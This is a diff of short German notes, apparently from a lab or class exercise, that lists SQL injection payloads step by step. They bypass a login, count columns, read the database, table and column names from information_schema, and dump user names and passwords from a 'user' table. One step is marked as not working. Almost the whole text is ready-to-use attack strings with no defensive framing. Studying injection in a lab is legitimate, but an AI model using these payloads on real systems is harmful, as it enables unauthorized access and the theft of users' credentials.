@@ -1,5 +1,20 @@
 FLORIAN:
-    Befehl, um Login zu umgehen:
+  Login umgehen:
+xxx@xxx.xxx' OR 1 = 1 LIMIT 1 -- ' 
 
-    xxx@xxx.xxx' OR 1 = 1 LIMIT 1 -- ' ] in Email Adresse eingeben, Passowrt egal was
-    Quelle: https://www.guru99.com/learn-sql-injection-with-practical-example.html
+Spaltenanzahl herausfinden:
+' OR 1 ORDER BY 1 -- -
+' UNION SELECT 1,2,3,4,5 -- -
+
+DB-NAME herausfinden:
+' UNION SELECT 1,database(),3,4,5 -- -
+
+Tabellenname herausfinden:
+' UNION SELECT 1,2,3,table_name,5 from information_schema.tables where table_schema=database()-- -
+
+Spaltenname herausfinden: [geht nicht]
+' UNION SELECT 1,2,3,column_name,5 from information_schema.columns where table_schema=database() and table_name=’user’-- -
+
+Daten abfragen:
+' UNION SELECT 1,2,3, group_concat(u_ID, u_Name) ,5 from user-- -
+' UNION SELECT 1,2,3, group_concat(u_ID,  u_PW) ,5 from user-- -
